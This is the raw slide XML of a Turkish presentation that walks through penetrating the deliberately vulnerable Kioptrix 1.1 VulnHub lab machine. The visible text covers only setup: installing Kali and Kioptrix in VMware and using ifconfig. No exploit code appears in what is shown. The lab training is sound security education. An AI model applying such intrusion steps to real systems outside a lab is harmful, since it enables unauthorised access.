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6" r:id="rId3"/>
    <p:sldId id="261" r:id="rId4"/>
    <p:sldId id="262" r:id="rId5"/>
    <p:sldId id="259" r:id="rId6"/>
    <p:sldId id="263" r:id="rId7"/>
    <p:sldId id="264" r:id="rId8"/>
    <p:sldId id="265" r:id="rId9"/>
    <p:sldId id="266" r:id="rId10"/>
    <p:sldId id="267" r:id="rId11"/>
    <p:sldId id="268" r:id="rId12"/>
    <p:sldId id="279" r:id="rId13"/>
    <p:sldId id="280" r:id="rId14"/>
    <p:sldId id="269" r:id="rId15"/>
    <p:sldId id="270" r:id="rId16"/>
    <p:sldId id="271" r:id="rId17"/>
    <p:sldId id="272" r:id="rId18"/>
    <p:sldId id="273" r:id="rId19"/>
    <p:sldId id="274" r:id="rId20"/>
    <p:sldId id="275" r:id="rId21"/>
    <p:sldId id="276" r:id="rId22"/>
    <p:sldId id="277" r:id="rId23"/>
    <p:sldId id="278" r:id="rId24"/>
    <p:sldId id="281" r:id="rId25"/>
    <p:sldId id="282" r:id="rId26"/>
    <p:sldId id="283" r:id="rId27"/>
    <p:sldId id="284" r:id="rId28"/>
    <p:sldId id="285" r:id="rId29"/>
    <p:sldId id="286" r:id="rId30"/>
    <p:sldId id="287" r:id="rId31"/>
    <p:sldId id="28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CB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AD65D7-A9A0-4A3B-A856-6256B7859AAB}" type="datetime1">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>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tr-TR"/>
              <a:t>Alihan Dursun</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>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E0E618-6479-4753-B745-A237149A188B}" type="slidenum">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>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AAB85-28C7-4706-9A4A-50F019F3C1BF}" type="datetime1">
              <a:rPr lang="tr-TR" smtClean="0"/>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endParaRPr lang="tr-TR"/>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>İkinci düzey</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>Üçüncü düzey</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>Dördüncü düzey</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
          <a:p>
            <a:pPr lvl="4"/>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>Beşinci düzey</a:t>
            </a:r>
            <a:endParaRPr lang="tr-T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tr-TR"/>
              <a:t>Alihan Dursun</a:t>
            </a:r>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835BF-6DFB-4765-BDBF-602D3E0CA3AC}" type="slidenum">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>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D3911598-0A69-4DBF-9840-6A12A579475E}" type="datetime1">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>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r>
              <a:rPr lang="tr-TR"/>
              <a:t>Alihan Dursun</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>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4C5A42F-8312-4B60-BFB0-ACEB06F8D412}" type="slidenum">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>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9CF8D728-D872-4BCE-B115-29728ABEA2F5}" type="datetime1">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>Alihan Dursun</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Slide Number Placeholder 5"/>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040A5EB4-EB46-4BC2-9E42-257D1BA20128}" type="datetime1">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>Alihan Dursun</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Slide Number Placeholder 5"/>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3FD7F468-E163-4136-B5B5-CF8539EA3538}" type="datetime1">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>Alihan Dursun</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Slide Number Placeholder 6"/>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012209AE-9A8F-405D-82D5-44CABB3FA4AB}" type="datetime1">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Footer Placeholder 7"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>Alihan Dursun</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="9" name="Slide Number Placeholder 8"/>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3A3D9CFA-F192-489F-807E-B4F7DB6392B8}" type="datetime1">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Footer Placeholder 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>Alihan Dursun</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Slide Number Placeholder 4"/>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E2364F2E-D1FC-44D1-AC2D-1BB775999DA3}" type="datetime1">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Footer Placeholder 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>Alihan Dursun</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Slide Number Placeholder 3"/>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A1F03660-DF3F-4F6D-A6E0-702320CEC75C}" type="datetime1">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>Alihan Dursun</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Slide Number Placeholder 6"/>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6A73F50-A862-4B49-9ECD-4A829BACBA01}" type="datetime1">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>Alihan Dursun</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="7" name="Slide Number Placeholder 6"/>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AEECD9D0-041F-49DF-B8C0-CA8EBC1F462F}" type="datetime1">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>Alihan Dursun</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Slide Number Placeholder 5"/>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AF56AA0-9B71-476F-8D64-F1400E24428E}" type="datetime1">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Footer Placeholder 4"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>Alihan Dursun</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Slide Number Placeholder 5"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:p>
            <a:fld id="{64C5A42F-8312-4B60-BFB0-ACEB06F8D412}" type="slidenum">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>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3CE6F85E-22A0-4BC2-A65E-E27E4C017BB1}" type="datetime1">
              <a:rPr lang="tr-TR" smtClean="0"/>
            </a:fld>
            <a:endParaRPr lang="tr-TR"/>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r>
              <a:rPr lang="tr-TR"/>
              <a:t>Alihan Dursun</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR"/>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64C5A42F-8312-4B60-BFB0-ACEB06F8D412}" type="slidenum">
              <a:rPr lang="tr-TR" smtClean="0"/>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pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="tr-TR" dirty="0"/>
              <a:t>Kioptrix Makinesine sızma</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Alt Başlık 2"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="subTitle" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="tr-TR" dirty="0"/>
              <a:t>Kioptrix sanal makinesine nasıl sızılır? </a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" dirty="0"/>
          </a:p>
          <a:p>
            <a:pPr algn="ctr"/>
            <a:r>
              <a:rPr lang="tr-TR" dirty="0"/>
              <a:t>Sızma Raporu ve anlatım</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Alt Bilgi Yer Tutucusu 3"/>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR"/>
              <a:t>MUSA YONCALIK</a:t>
            </a:r>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duotone>
              <a:schemeClr val="bg2">
                <a:shade val="88000"/>
                <a:hueMod val="106000"/>
                <a:satMod val="140000"/>
                <a:lumMod val="54000"/>
              </a:schemeClr>
              <a:schemeClr val="bg2">
                <a:tint val="98000"/>
                <a:hueMod val="90000"/>
                <a:satMod val="150000"/>
                <a:lumMod val="160000"/>
              </a:schemeClr>
            </a:duotone>
          </a:blip>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </a:blipFill>
        <a:effectLst/>
      </p:bgPr>
    </p:bg>
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="286" name="Picture 2"/>
          <p:cNvPicPr>
            <a:picLocks noGrp="1" noRot="1" noChangeAspect="1" noMove="1" noResize="1" noEditPoints="1" noAdjustHandles="1" noChangeArrowheads="1" noChangeShapeType="1" noCrop="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p:spPr>
      </p:pic>
      <p:grpSp>
        <p:nvGrpSpPr>
          <p:cNvPr id="287" name="Group 8"/>
          <p:cNvGrpSpPr>
            <a:grpSpLocks noGrp="1" noRot="1" noChangeAspect="1" noMove="1" noResize="1" noUngrp="1"/>
          </p:cNvGrpSpPr>
          <p:nvPr/>
        </p:nvGrpSpPr>
        <p:grpSpPr>
          <a:xfrm>
            <a:off x="-14288" y="0"/>
            <a:ext cx="12053888" cy="6858001"/>
            <a:chOff x="-14288" y="0"/>
            <a:chExt cx="12053888" cy="6858001"/>
          </a:xfrm>
        </p:grpSpPr>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="10" name="Group 9"/>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8" name="Rectangle 5"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="114300" y="4763"/>
                <a:ext cx="23813" cy="2181225"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:grpFill/>
              <a:ln>
                <a:noFill/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="289"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tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="290"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291"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="292"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="293"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="294"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="295"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="296"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297"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="298"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="299"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="300"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="301"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="302"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="303"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="304" name="Rectangle 21"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="133350" y="4662488"/>
                <a:ext cx="23813" cy="2181225"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:grpFill/>
              <a:ln>
                <a:noFill/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="305"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="306"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tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="307"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="308"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09"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="310"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="311"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12"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13"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="314"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
        <p:grpSp>
          <p:nvGrpSpPr>
            <p:cNvPr id="11" name="Group 10"/>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15"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="316"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="317"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18"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="319"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="320"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="321"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22"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txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="323"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tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
          <p:sp>
            <p:nvSpPr>
              <p:cNvPr id="324" name="Rectangle 41"/>
              <p:cNvSpPr>
                <a:spLocks noChangeArrowheads="1"/>
              </p:cNvSpPr>
              <p:nvPr/>
            </p:nvSpPr>
            <p:spPr bwMode="auto">
              <a:xfrm>
                <a:off x="11939587" y="6596063"/>
                <a:ext cx="23813" cy="252413"/>
              </a:xfrm>
              <a:prstGeom prst="rect">
                <a:avLst/>
              </a:prstGeom>
              <a:grpFill/>
              <a:ln>
                <a:noFill/>
              </a:ln>
            </p:spPr>
            <p:txBody>
              <a:bodyPr/>
              <a:lstStyle/>
              <a:p>
                <a:endParaRPr lang="tr-TR"/>
              </a:p>
            </p:txBody>
          </p:sp>
        </p:grpSp>
      </p:grpSp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Metin kutusu 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1141411" y="2249487"/>
            <a:ext cx="7631927" cy="1663752"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr vert="horz" lIns="91440" tIns="45720" rIns="91440" bIns="45720" rtlCol="0" anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr indent="-228600" defTabSz="914400">
              <a:lnSpc>
                <a:spcPct val="120000"/>
              </a:lnSpc>
              <a:spcAft>
                <a:spcPts val="600"/>
              </a:spcAft>
              <a:buSzPct val="125000"/>
              <a:buFont typeface="Arial" panose="020B0604020202020204" pitchFamily="34" charset="0"/>
              <a:buChar char="•"/>
            </a:pPr>
            <a:r>
              <a:rPr lang="en-US" sz="2000" dirty="0"/>
              <a:t>Kiotprix, vulnhub tarafından yayımlanan ve belirli açıkları olan bir makinedir. Bu makinenin her seviyesinde farklı açıklar bulunan versiyonları vardır. Bu çalışmada seviye 1.1 olan kioptrix makinesinin açıklarından faydalanılıp, bir sızma testi çalışması yapılmaktadır.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302774" y="2829269"/>
            <a:ext cx="9586452" cy="400110"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>Kali ve Kioptrix sanal makinelerini internetten indirip vmware’e ekliyoruz.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">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7" descr="ekran görüntüsü, metin, multimedya yazılımı, grafik yazılımı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06249" y="949206"/>
            <a:ext cx="10884310" cy="5691615"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="2" name="Metin kutusu 1"/>
          <p:cNvSpPr txBox="1"/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1373774" y="83595"/>
            <a:ext cx="9343388"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2-)İşletim sistemine giriş yaptıktan </a:t>
            </a:r>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0" err="1">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t>sonra,Kali</a:t>
            </a:r>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
              <a:t> terminaline ‘ifconfig’ komutu yazarak ip adresimizi öğreniyoruz.</a:t>
            </a:r>
            <a:endParaRPr lang="tr-TR" sz="2000" dirty="0">
              <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Dikdörtgen 4"/>
          <p:cNvSpPr/>
          <p:nvPr/>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="1225026" y="1938328"/>
            <a:ext cx="2373579" cy="22476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866210" y="2416278"/>
            <a:ext cx="5617243" cy="1323439"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:solidFill>
            <a:schemeClr val="bg1"/>
          </a:solidFill>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="none" rtlCol="0">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="tr-TR" sz="2000" dirty="0">
                <a:latin typeface="Century Gothic" panose="020B0502020202020204" pitchFamily="34" charset="0"/>
              </a:rPr>
